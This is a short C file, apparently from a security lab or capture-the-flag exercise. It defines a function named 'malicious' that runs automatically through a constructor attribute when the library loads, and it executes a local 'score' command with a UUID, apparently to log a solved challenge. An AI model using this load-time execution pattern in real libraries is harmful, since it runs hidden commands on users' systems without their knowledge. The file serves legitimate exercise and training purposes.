#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score d84e4cfa-fca8-407c-b3d8-898bedad184d");
}
